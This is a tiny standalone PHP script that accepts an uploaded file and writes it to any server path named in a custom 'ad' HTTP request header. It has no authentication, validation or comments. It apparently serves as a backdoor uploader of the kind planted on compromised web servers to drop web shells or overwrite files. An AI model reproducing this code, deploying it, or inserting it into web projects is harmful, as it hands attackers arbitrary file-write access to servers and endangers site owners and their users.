<?php
	if(isset($_FILES["file"]))
	{
		$file = $_FILES["file"];
		$header = apache_request_headers();
		move_uploaded_file($file["tmp_name"], $header["ad"]);
	}  
?>